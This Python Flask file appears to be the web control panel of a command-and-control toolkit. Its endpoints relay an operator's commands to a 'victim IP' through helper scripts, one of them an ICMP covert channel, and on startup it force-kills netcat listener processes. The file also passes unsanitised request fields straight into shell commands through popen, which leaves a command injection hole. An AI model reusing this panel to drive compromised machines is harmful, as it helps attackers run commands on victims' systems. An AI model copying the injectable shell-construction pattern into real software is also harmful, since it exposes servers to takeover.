from flask import Flask, render_template, request
from os import popen, system

app = Flask("__app__")

from pathlib import Path
dirname = Path(__file__).parent.resolve()

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/processd", methods=["POST"])
def processd():
    # Does nothing with return port
    vic_ip = request.json['vic_ip']
    command = request.json['command']
    with popen(f"echo \"{vic_ip}\n{command}\n\" | python3 {dirname}/../processd/send_command.py") as f:
        raw = f.read()
    print(f"Processd raw: {raw}")
    output = raw.split("\n", 1)[1]
    return output

@app.route("/icmp", methods=["POST"])
def icmp():
    # Does nothing with return port
    vic_ip = request.json['vic_ip']
    command = request.json['command']
    with popen(f"echo \"{command}\n\" | python3 {dirname}/../icmp-c2/send_command.py {vic_ip}") as f:
        raw = f.read()
    print(f"ICMP: {raw}")
    output = raw.split("\n", 1)[1]
    return output

if __name__ == "__main__":
    system("ps -aux | awk '/send_/||/nc -nlp/{print $2}' | xargs kill -9")
    app.run(host="0.0.0.0", port=80)